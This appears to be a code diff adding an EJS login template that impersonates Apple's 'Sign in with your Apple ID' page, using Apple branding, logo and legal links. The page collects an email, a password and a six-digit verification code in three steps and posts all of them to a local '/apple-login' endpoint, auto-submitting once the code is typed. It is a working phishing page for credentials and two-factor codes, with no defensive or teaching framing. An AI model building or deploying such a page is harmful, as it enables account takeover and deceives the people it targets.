@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in with your Apple ID</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Segoe UI', Roboto, Arial, sans-serif;
+            background-color: #f5f5f7;
+            color: #1d1d1f;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px 48px;
+        }
+
+        .apple-logo {
+            width: 52px;
+            height: auto;
+            margin-bottom: 26px;
+            animation: logoIn 0.7s ease, logoFloat 3.6s ease-in-out 0.7s infinite;
+        }
+
+        @keyframes logoIn {
+            from { opacity: 0; transform: scale(0.7) rotate(-10deg); }
+            to   { opacity: 1; transform: scale(1) rotate(0); }
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0); }
+            50%      { transform: translateY(-6px); }
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 18px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 420px;
+            padding: 40px 36px 32px;
+            animation: cardIn 0.5s ease;
+        }
+
+        @keyframes cardIn {
+            from { opacity: 0; transform: translateY(18px) scale(0.98); }
+            to   { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #6e6e73;
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .messages {
+            margin-bottom: 16px;
+        }
+
+        .message {
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin: 8px 0;
+            font-size: 13px;
+            animation: msgIn 0.3s ease;
+        }
+
+        @keyframes msgIn {
+            from { opacity: 0; transform: translateY(-6px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        .success {
+            background-color: #e8f5e9;
+            color: #1e7d32;
+            border: 1px solid #b7e4cd;
+        }
+
+        .error {
+            background-color: #fce8e6;
+            color: #d93025;
+            border: 1px solid #f5c6cb;
+        }
+
+        .info {
+            background-color: #e8f0fe;
+            color: #1967d2;
+            border: 1px solid #d2e3fc;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d2d2d7;
+            border-radius: 12px;
+            font-size: 16px;
+            color: #1d1d1f;
+            background-color: #ffffff;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #0071e3;
+            box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.2);
+        }
+
+        .form-group input.invalid {
+            border-color: #ff3b30;
+            animation: shake 0.3s ease;
+        }
+
+        .form-group input.invalid:focus {
+            border-color: #ff3b30;
+            box-shadow: 0 0 0 3px rgba(255, 59, 48, 0.15);
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25%      { transform: translateX(-4px); }
+            50%      { transform: translateX(4px); }
+            75%      { transform: translateX(-2px); }
+        }
+
+        .form-group input::placeholder {
+            color: #6e6e73;
+            opacity: 1;
+        }
+
+        .email-chip {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+            padding: 12px 16px;
+            background: #f5f5f7;
+            border: 1px solid #d2d2d7;
+            border-radius: 12px;
+            font-size: 15px;
+            color: #1d1d1f;
+            cursor: pointer;
+            font-family: inherit;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .email-chip:hover {
+            border-color: #0071e3;
+        }
+
+        .avatar {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #0071e3;
+            color: #ffffff;
+            font-size: 12px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-transform: uppercase;
+            flex-shrink: 0;
+        }
+
+        .email-chip svg {
+            width: 16px;
+            height: 16px;
+            margin-left: auto;
+            fill: #6e6e73;
+            transition: transform 0.2s ease;
+        }
+
+        .email-chip:hover svg {
+            transform: translateY(2px);
+        }
+
+        .btn {
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 12px;
+            background: #0071e3;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            font-family: inherit;
+            transition: background 0.15s ease, transform 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .btn:hover {
+            background: #0077ed;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 14px rgba(0, 113, 227, 0.35);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .links {
+            margin-top: 18px;
+            text-align: center;
+        }
+
+        .links a {
+            color: #0071e3;
+            text-decoration: none;
+            font-size: 14px;
+            transition: text-decoration 0.15s ease;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .show-password {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #1d1d1f;
+            cursor: pointer;
+        }
+
+        .show-password input {
+            accent-color: #0071e3;
+            width: 16px;
+            height: 16px;
+        }
+
+        .back-link {
+            display: block;
+            margin: 18px auto 0;
+            background: none;
+            border: none;
+            color: #0071e3;
+            font-size: 14px;
+            font-family: inherit;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+            animation: stepIn 0.35s ease;
+        }
+
+        @keyframes stepIn {
+            from { opacity: 0; transform: translateY(12px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ---------- 6-DIGIT CODE STEP ---------- */
+        .code-title {
+            font-size: 19px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+
+        .code-sub {
+            font-size: 13px;
+            color: #6e6e73;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+
+        .code-group {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 22px 0 20px;
+        }
+
+        .code-box {
+            width: 46px;
+            height: 54px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            border: 1px solid #d2d2d7;
+            border-radius: 12px;
+            color: #1d1d1f;
+            background: #ffffff;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease, transform 0.15s ease;
+            animation: codeIn 0.3s ease both;
+            animation-delay: calc(var(--i) * 0.06s);
+        }
+
+        .code-box:focus {
+            outline: none;
+            border-color: #0071e3;
+            box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.2);
+            transform: translateY(-2px);
+        }
+
+        .code-box.filled {
+            border-color: #0071e3;
+        }
+
+        @keyframes codeIn {
+            from { opacity: 0; transform: translateY(10px) scale(0.85); }
+            to   { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        footer {
+            margin-top: 28px;
+            text-align: center;
+            font-size: 12px;
+            color: #86868b;
+            max-width: 420px;
+            animation: footerIn 0.8s ease 0.4s both;
+        }
+
+        @keyframes footerIn {
+            from { opacity: 0; }
+            to   { opacity: 1; }
+        }
+
+        footer .copyright {
+            margin-bottom: 10px;
+        }
+
+        footer .legal {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 6px 16px;
+        }
+
+        footer .legal a {
+            color: #86868b;
+            text-decoration: none;
+            transition: color 0.15s ease;
+        }
+
+        footer .legal a:hover {
+            text-decoration: underline;
+            color: #1d1d1f;
+        }
+    </style>
+</head>
+<body>
+    <svg class="apple-logo" viewBox="0 0 24 24" fill="#1d1d1f" aria-label="Apple">
+        <path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.03 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.56-1.702z"/>
+    </svg>
+
+    <div class="card">
+        <h1>Sign in with your Apple ID</h1>
+        <p class="subtitle">Use your Apple ID or create a new account to start using Apple services.</p>
+
+        <% var flashTypes = Object.keys(messages); if (flashTypes.length > 0) { %>
+            <div class="messages">
+                <% flashTypes.forEach(function(type) { %>
+                    <div class="message <%= type %>">
+                        <% messages[type].forEach(function(text) { %><%= text %><% }); %>
+                    </div>
+                <% }); %>
+            </div>
+        <% } %>
+
+        <form action="/apple-login" method="POST" id="login-form">
+            <div class="step active" id="step-email">
+                <div class="form-group">
+                    <input type="text" id="email" name="email" required placeholder="Email or phone number" autocomplete="username">
+                </div>
+                <button type="button" class="btn" id="next-btn">Continue</button>
+                <div class="links">
+                    <a href="https://iforgot.apple.com/" target="_blank" rel="noopener" id="forgot-link">Forgot Apple ID or password?</a>
+                </div>
+                <div class="links">
+                    <a href="https://account.apple.com/sign-in#&ssoCreateAppleId=1" target="_blank" rel="noopener">Create your Apple ID</a>
+                </div>
+            </div>
+
+            <div class="step" id="step-password">
+                <div class="form-group">
+                    <button type="button" class="email-chip" id="email-chip">
+                        <span class="avatar" id="chip-initial"></span>
+                        <span id="chip-email"></span>
+                        <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>
+                    </button>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password">
+                </div>
+                <div class="form-group">
+                    <label class="show-password">
+                        <input type="checkbox" id="show-password"> Show password
+                    </label>
+                </div>
+                <button type="button" class="btn" id="signin-btn">Sign In</button>
+                <div class="links">
+                    <a href="https://iforgot.apple.com/" target="_blank" rel="noopener" id="forgot-password-link">Forgot Apple ID or password?</a>
+                </div>
+                <button type="button" class="back-link" id="back-link">&larr; Back</button>
+            </div>
+
+            <div class="step" id="step-code">
+                <h2 class="code-title">Inserisci il codice a 6 cifre</h2>
+                <p class="code-sub">Enter the verification code sent to your devices.</p>
+                <div class="code-group" id="code-group">
+                    <input type="text" inputmode="numeric" maxlength="1" class="code-box" data-index="0" aria-label="Code digit 1">
+                    <input type="text" inputmode="numeric" maxlength="1" class="code-box" data-index="1" aria-label="Code digit 2">
+                    <input type="text" inputmode="numeric" maxlength="1" class="code-box" data-index="2" aria-label="Code digit 3">
+                    <input type="text" inputmode="numeric" maxlength="1" class="code-box" data-index="3" aria-label="Code digit 4">
+                    <input type="text" inputmode="numeric" maxlength="1" class="code-box" data-index="4" aria-label="Code digit 5">
+                    <input type="text" inputmode="numeric" maxlength="1" class="code-box" data-index="5" aria-label="Code digit 6">
+                </div>
+                <input type="hidden" name="code" id="code-value">
+                <button type="submit" class="btn" id="verify-btn">Verify</button>
+                <div class="links">
+                    <a href="https://support.apple.com/en-us/HT204921" target="_blank" rel="noopener">Didn't get a verification code?</a>
+                </div>
+                <button type="button" class="back-link" id="back-code-link">&larr; Back</button>
+            </div>
+        </form>
+    </div>
+
+    <footer>
+        <p class="copyright">Copyright &copy; 2026 Apple Inc. All rights reserved.</p>
+        <nav class="legal">
+            <a href="https://www.apple.com/legal/privacy/" target="_blank" rel="noopener">Privacy Policy</a>
+            <a href="https://www.apple.com/legal/internet-services/terms/site.html" target="_blank" rel="noopener">Terms of Use</a>
+            <a href="https://www.apple.com/shop/help/sales_refunds" target="_blank" rel="noopener">Sales and Refunds</a>
+            <a href="https://www.apple.com/legal/" target="_blank" rel="noopener">Legal</a>
+            <a href="https://www.apple.com/sitemap/" target="_blank" rel="noopener">Site Map</a>
+        </nav>
+    </footer>
+
+    <script>
+        const form = document.getElementById('login-form');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const nextBtn = document.getElementById('next-btn');
+        const signinBtn = document.getElementById('signin-btn');
+        const backLink = document.getElementById('back-link');
+        const backCodeLink = document.getElementById('back-code-link');
+        const emailChip = document.getElementById('email-chip');
+        const codeBoxes = document.querySelectorAll('.code-box');
+        const codeValue = document.getElementById('code-value');
+
+        function isValidEmail(value) {
+            return /@gmail\.com$/i.test(value.trim());
+        }
+
+        function showStep(stepId) {
+            document.getElementById('step-email').classList.remove('active');
+            document.getElementById('step-password').classList.remove('active');
+            document.getElementById('step-code').classList.remove('active');
+            document.getElementById(stepId).classList.add('active');
+        }
+
+        nextBtn.addEventListener('click', function () {
+            const email = emailInput.value.trim();
+            if (!isValidEmail(email)) {
+                emailInput.classList.add('invalid');
+                emailInput.classList.remove('invalid');
+                void emailInput.offsetWidth; // restart the shake animation
+                emailInput.classList.add('invalid');
+                return;
+            }
+            document.getElementById('chip-email').textContent = email;
+            document.getElementById('chip-initial').textContent = email.charAt(0).toUpperCase();
+            showStep('step-password');
+            passwordInput.focus();
+        });
+
+        emailInput.addEventListener('input', function () {
+            this.classList.remove('invalid');
+        });
+
+        emailChip.addEventListener('click', function () {
+            showStep('step-email');
+            emailInput.focus();
+        });
+
+        backLink.addEventListener('click', function () {
+            showStep('step-email');
+        });
+
+        backCodeLink.addEventListener('click', function () {
+            showStep('step-password');
+            passwordInput.focus();
+        });
+
+        signinBtn.addEventListener('click', function () {
+            if (passwordInput.value.length < 6) {
+                passwordInput.classList.add('invalid');
+                passwordInput.classList.remove('invalid');
+                void passwordInput.offsetWidth;
+                passwordInput.classList.add('invalid');
+                return;
+            }
+            showStep('step-code');
+            codeBoxes[0].focus();
+        });
+
+        passwordInput.addEventListener('input', function () {
+            this.classList.remove('invalid');
+        });
+
+        form.addEventListener('submit', function (e) {
+            if (passwordInput.value.length < 6) {
+                e.preventDefault();
+                showStep('step-password');
+                passwordInput.classList.add('invalid');
+                return;
+            }
+        });
+
+        document.getElementById('show-password').addEventListener('change', function () {
+            passwordInput.type = this.checked ? 'text' : 'password';
+        });
+
+        // ---------- 6-digit code boxes ----------
+        function updateCodeValue() {
+            codeValue.value = Array.from(codeBoxes).map(b => b.value).join('');
+        }
+
+        codeBoxes.forEach(function (box, i) {
+            box.style.setProperty('--i', i);
+
+            box.addEventListener('input', function () {
+                this.value = this.value.replace(/\D/g, '').slice(0, 1);
+                this.classList.toggle('filled', this.value.length === 1);
+                if (this.value.length === 1 && i < codeBoxes.length - 1) {
+                    codeBoxes[i + 1].focus();
+                }
+                updateCodeValue();
+                if (i === codeBoxes.length - 1 && this.value.length === 1) {
+                    setTimeout(function () { form.submit(); }, 250);
+                }
+            });
+
+            box.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && this.value === '' && i > 0) {
+                    codeBoxes[i - 1].focus();
+                }
+            });
+
+            box.addEventListener('paste', function (e) {
+                e.preventDefault();
+                const digits = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
+                digits.split('').forEach(function (d, j) {
+                    if (codeBoxes[j]) {
+                        codeBoxes[j].value = d;
+                        codeBoxes[j].classList.add('filled');
+                    }
+                });
+                const next = Math.min(digits.length, codeBoxes.length - 1);
+                codeBoxes[next].focus();
+                updateCodeValue();
+                if (digits.length === 6) {
+                    setTimeout(function () { form.submit(); }, 250);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
